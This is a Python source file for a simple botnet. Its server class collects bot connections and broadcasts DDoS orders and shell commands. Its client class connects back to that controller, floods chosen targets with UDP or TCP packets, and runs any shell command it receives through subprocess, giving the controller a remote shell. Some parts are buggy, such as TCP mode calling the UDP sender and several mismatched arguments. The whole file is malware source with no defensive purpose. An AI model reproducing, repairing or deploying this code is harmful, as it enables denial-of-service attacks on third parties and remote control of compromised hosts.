import socket
import sys
import threading
import logging
import os
from concurrent.futures import ThreadPoolExecutor
import threading
from time import time as now
import subprocess


class ServerBotnet:
    def __init__(self, host, port) -> None:
        self.host = host
        self.port = port
        self.exit = False
        self.conns = {}


    def listen(self) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))

        threading.Thread(target=self.acceptConnection, args=(s,)).start()

    
    def acceptConnection(self, s: socket.socket):
        while self.exit == False:
            s.listen()
            conn, addr = s.accept()
            self.conns.update({addr: conn})



    def attack(self, host: str, port: int, protocol: str, time: int) -> None:
        attack_info = "attack" + "&" + host + "&" + str(port) + "&" + protocol + "&" + str(time)
        
        for conn in self.conns:
            try:
                self.conns[conn].settimeout(10)
                self.conns[conn].send(attack_info.encode())

            except Exception as e:
                logging.error(e)
    

    def ping(self, host: str) -> bool:
        if host in self.conns:
            try:
                self.conns[host].settimeout(10)
                self.conns[host].send(b"ping")
                check = self.conns[host].recv(1024)
                if check == b"pong":
                    return 0
            
            except TimeoutError:
                self.conns.pop(host)
                return 1
        
        else:
            return 2
        
    
    def ping_all(self, autoremove: bool = False) -> dict:
        alives = {}

        for host in self.conns:
            response = self.ping(host)

            if response == 0:
                alives.update({host: True})
            
            else:
                alives.update({host: False})
            
        return alives
    
    
    def shell(self, host: str, command: str) -> str:
        if host in self.conns:
            try:
                self.conns[host].settimeout(10)
                self.conns[host].send(b"shell")
                check = self.conns[host].recv(1024)

                if check == b"OK":
                    self.conns[host].settimeout(None)
                    self.conns[host].send(command.encode())
                    out = self.conns[host].recv(4096)
                    
                    return out
            
            except Exception as e:
                logging.error(e)
    

    def remove(self, host: str) -> None:
        if host in self.conns:
            self.conns[host].send(b"exit")
            self.conns.pop(host)


    def remove_all(self) -> None:
        self.conns.clear()


    def connectedHosts(self):
        return [host for host in self.conns]



class ClinetBotnet():
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connected = False
        self.time = 0
        self.sent = 0
        self.lock = threading.Lock()
    

    def connect(self):    
        try:
            self.socket.connect((self.host, self.port))
            self.connected = True
        
        except Exception as e:
            logging.error(e)


    def _listen(self):
        command = b""
        s = self.socket

        while command != b"exit":
            command = s.recv(1024).decode().split("&")

            if "attack" in command:
                host = command[1]
                port = int(command[2])
                protocol = command[3]
                time = int(command[4])

                if protocol.lower() == "udp":
                    self.udp(host, port, time)
                
                elif protocol.lower() == "tcp":
                    self.tcp(host, port, time)

            if "ping" in command:
                s.send(b"pong")

            if "shell" in command:
                s.send(b"OK")
                command = s.recv(4096).decode()
                output = self.shell(command)
                s.send(output)
    

    def _sendUdp(self, host: str, port: int, Bytes: int):
        """ Send UDP packets until it reaches the maximum number of packets set """

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while True:
            with self.lock:
                if self.time - now() <= 0:
                    break

            s.sendto(os.urandom(Bytes), (host, port))


    def udp(self, host: str, port: str, time: int = 60, Bytes: int = 64):
        """ Start the UDP stress process """

        with ThreadPoolExecutor(max_workers=16) as executor:
            self.time = time + now()
            for _ in range(16):
                executor.submit(self._sendUdp, host, port, time, Bytes)
    

    def _sendTcp(self, host: str, port: int, Bytes: int):
        """ Send UDP packets until it reaches the maximum number of packets set """

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        try:

            s.connect((host, port))

            while True:
                with self.lock:
                    if self.time - now() <= 0:
                        break

                s.send(os.urandom(Bytes), (host, port))
            
        except Exception as e:
            logging.error(e)


    def tcp(self, host: str, port: str, time: int = 60, Bytes: int = 64):
        """ Start the UDP stress process """

        with ThreadPoolExecutor(max_workers=16) as executor:
            self.time = time + now()
            for _ in range(16):
                executor.submit(self._sendUdp, host, port, time, Bytes)
    

    def shell(self, command: str):
        try:
            output = subprocess.check_output(command, shell=True)
            self.socket.send(output)
        
        except:
            self.socket.send("[Botnet] Shell Error")